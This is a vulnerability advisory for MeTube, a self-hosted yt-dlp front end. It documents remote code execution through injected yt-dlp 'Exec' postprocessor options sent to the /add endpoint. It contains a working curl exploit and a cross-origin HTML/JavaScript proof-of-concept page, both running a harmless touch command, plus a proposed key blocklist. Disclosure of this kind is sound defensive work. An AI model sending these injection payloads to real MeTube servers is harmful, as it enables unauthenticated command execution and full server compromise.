# CVE Report: Remote Code Execution via yt-dlp Postprocessor Injection in alexta69/MeTube

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Product** | MeTube (alexta69/metube) |
| **Affected Version** | <= 2026.04.09 (all versions with ALLOW_YTDL_OPTIONS_OVERRIDES=true) |
| **Vulnerability Type** | CWE-94: Improper Control of Generation of Code ('Code Injection') |
| **Attack Vector** | Network (Remote) |
| **Authentication Required** | None |
| **User Interaction** | Required (victim must visit attacker-controlled page) |
| **CVSS 3.1 Base Score** | 9.6 (Critical) |
| **CVSS 3.1 Vector** | AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H |

## Description

MeTube is a self-hosted web UI for youtube-dl/yt-dlp with over 13,000 GitHub stars. When the `ALLOW_YTDL_OPTIONS_OVERRIDES` environment variable is set to `true`, the application accepts arbitrary yt-dlp configuration options from user input via the `/add` API endpoint. These options are passed directly to the yt-dlp Python library without sanitization. An attacker can inject a yt-dlp `Exec` postprocessor that executes arbitrary OS commands on the server after a download completes.

This vulnerability is exploitable remotely via cross-origin requests due to a separate permissive CORS policy (see companion report), meaning a malicious website can achieve RCE on the victim's server without any authentication.

## Root Cause

The `/add` endpoint accepts a `ytdl_options_overrides` JSON object from user input. In `app/main.py`, line 486-489, the overrides are parsed and accepted when the feature is enabled:

```python
ytdl_options_overrides = _parse_ytdl_options_overrides(
    ytdl_options_overrides,
    enabled=config.ALLOW_YTDL_OPTIONS_OVERRIDES,
)
```

The parsing function at line 237-251 only validates that the value is a JSON object — it does not restrict which yt-dlp options can be set:

```python
def _parse_ytdl_options_overrides(value, *, enabled: bool) -> dict:
    if value is None or value == '':
        return {}
    if isinstance(value, str):
        try:
            value = json.loads(value)
        except json.JSONDecodeError as exc:
            raise web.HTTPBadRequest(reason='ytdl_options_overrides must be valid JSON') from exc
    if not isinstance(value, dict):
        raise web.HTTPBadRequest(reason='ytdl_options_overrides must be a JSON object')
    if value and not enabled:
        raise web.HTTPBadRequest(reason='ytdl_options_overrides are disabled')
    return value
```

These overrides are merged into the yt-dlp parameters at `app/ytdl.py`, line 850:

```python
ytdl_options.update(getattr(dl, 'ytdl_options_overrides', {}) or {})
```

And ultimately passed to yt-dlp at `app/ytdl.py`, line 462-475:

```python
ytdl_params = {
    'quiet': not debug_logging,
    'paths': {"home": self.download_dir, "temp": self.temp_dir},
    ...
    **self.ytdl_opts,  # attacker-controlled options merged here
}
ret = yt_dlp.YoutubeDL(params=ytdl_params).download([self.info.url])
```

yt-dlp's `Exec` postprocessor executes an arbitrary shell command after processing a download. By injecting this postprocessor via overrides, an attacker achieves arbitrary command execution as the application user.

## Impact

An attacker can execute arbitrary OS commands on the MeTube server with the privileges of the application process. This enables:

- Full server compromise (reverse shell, backdoor installation)
- Data exfiltration from the server or internal network
- Lateral movement within the network
- Cryptocurrency mining, botnet enrollment
- Destruction of data on the server

When combined with the CORS origin reflection vulnerability (see companion report), this is exploitable from any website the victim visits — no direct access to the MeTube instance is needed.

## Proof of Concept

### Step 1: Start MeTube with overrides enabled

```bash
docker run -d --name metube -p 8081:8081 -e ALLOW_YTDL_OPTIONS_OVERRIDES=true alexta69/metube@sha256:2ad2f7b064afc87184ce45466634048fd5c690de7c0f776bdbdf98de430173e5
```

### Step 2: Send malicious request

```bash
curl -X POST http://localhost:8081/add \
  -H 'Content-Type: application/json' \
  -d '{
    "url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "quality": "128",
    "download_type": "audio",
    "format": "mp3",
    "codec": "auto",
    "ytdl_options_overrides": {
      "postprocessors": [{"key": "Exec", "exec_cmd": "touch /tmp/metube-rce-proof"}]
    }
  }'
```

### Step 3: Verify code execution

After the download completes:

```bash
docker exec metube ls -la /tmp/metube-rce-proof
```

Output:

```
-rw-r--r-- 1 1000 1000 0 Apr 10 00:31 /tmp/metube-rce-proof
```

### Cross-Origin Exploitation (via CORS vulnerability)

Save as HTML and open in a browser while MeTube is running:

```html
<!DOCTYPE html>
<html>
<head><title>MeTube RCE PoC</title></head>
<body>
<h2>MeTube RCE PoC</h2>
<button id="btn">Execute remote command</button>
<pre id="log"></pre>
<script>
document.getElementById('btn').onclick = async () => {
    const log = document.getElementById('log');
    try {
        const resp = await fetch('http://localhost:8081/add', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                quality: '128',
                download_type: 'audio',
                format: 'mp3',
                codec: 'auto',
                ytdl_options_overrides: {
                    postprocessors: [{key: 'Exec', exec_cmd: 'touch /tmp/metube-rce-proof'}]
                }
            })
        });
        log.textContent = `[+] Response (${resp.status}): ${await resp.text()}\n`;
        log.textContent += '[+] Command will execute after download completes.\n';
        log.textContent += '[+] Verify: docker exec metube ls -la /tmp/metube-rce-proof';
    } catch(e) {
        log.textContent = '[-] Failed: ' + e.message;
    }
};
</script>
</body>
</html>
```

## Preconditions

- The `ALLOW_YTDL_OPTIONS_OVERRIDES` environment variable must be set to `true` (default is `false`)
- This is a documented feature intended for power users and is referenced in the project's README
- The CORS vulnerability (companion report) enables remote exploitation without direct network access to the MeTube instance

## Recommended Fix

1. **Deny dangerous yt-dlp options.** Implement a blocklist that rejects overrides containing keys known to enable code execution:

```python
DANGEROUS_YTDL_KEYS = {'postprocessors', 'exec_cmd', 'exec', 'external_downloader', 'external_downloader_args'}

def _parse_ytdl_options_overrides(value, *, enabled: bool) -> dict:
    # ... existing validation ...
    if value and not enabled:
        raise web.HTTPBadRequest(reason='ytdl_options_overrides are disabled')
    dangerous = set(value.keys()) & DANGEROUS_YTDL_KEYS
    if dangerous:
        raise web.HTTPBadRequest(reason=f'ytdl_options_overrides contains blocked keys: {dangerous}')
    return value
```

2. **Alternatively, use an allowlist** of safe yt-dlp options instead of accepting arbitrary keys.

3. **Fix the CORS policy** to prevent cross-origin exploitation (see companion report).

## Timeline

| Date | Event |
|------|-------|
| 2026-04-09 | Vulnerability discovered |
| 2026-04-09 | PoC developed and tested against version 2026.04.09 |

## References

- https://github.com/alexta69/metube
- CWE-94: https://cwe.mitre.org/data/definitions/94.html
- yt-dlp Exec postprocessor: https://github.com/yt-dlp/yt-dlp#modifying-metadata
